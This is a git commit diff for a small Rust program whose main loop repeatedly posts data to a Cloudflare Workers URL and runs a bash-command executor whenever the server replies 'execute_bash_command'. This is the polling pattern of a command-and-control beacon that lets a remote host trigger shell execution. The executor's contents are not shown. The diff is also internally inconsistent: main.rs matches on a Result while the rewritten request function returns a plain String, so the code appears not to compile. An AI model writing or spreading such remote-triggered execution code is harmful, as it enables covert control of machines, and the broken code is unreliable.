f590dd4edaac6b7b81911d8b320900dd5528167f
AlphaRora <adoba@alpharora.com>
2024-04-09 22:54:15 -0400

    spa

--- src/main.rs
+++ src/main.rs
@@ -1,22 +1,25 @@
-// main.rs
 mod command_executor;
 mod worker_communication;
 
 #[tokio::main]
 async fn main() {
     let worker_url = "https://serverworker.adoba.workers.dev/";
+
     loop {
         // Send data to the Worker
-        let response = worker_communication::send_data_request(&worker_url, "Sample data").await;
+        let response = match worker_communication::send_data_request(&worker_url, "Sample data").await {  
+            Ok(response) => response,  
+            Err(e) => {  
+                println!("Error: {}", e);  
+                continue;  
+            }  
+        };  
+        
 
         // Check the response from the Worker
-        let request_successful = response == "execute_bash_command";
-        if request_successful {
-            command_executor::execute_bash_command(true);
-        } else {
-            command_executor::execute_bash_command(false);
+        if response == "execute_bash_command" {
+            command_executor::execute_bash_command();
         }
-
         // Add more conditions or logic to handle different commands
     }
 }
--- src/worker_communication.rs
+++ src/worker_communication.rs
@@ -1,10 +1,13 @@
-pub async fn send_data_request(worker_url: &str, data: &str) -> Result<String, reqwest::Error> {  
-    let client = Client::new();  
-    let response = client  
-        .post(worker_url)  
-        .body(data.to_owned())  
-        .send()  
-        .await?;  
-  
-    Ok(response.text().await?)  
-}  
+// src/worker_communication.rs
+use reqwest::Client;
+
+pub async fn send_data_request(worker_url: &str, data: &str) -> String {
+    let client = Client::new();
+    let response = client
+        .post(worker_url)
+        .body(data.to_owned())
+        .send()
+        .await
+        .unwrap();
+    response.text().await.unwrap()
+}
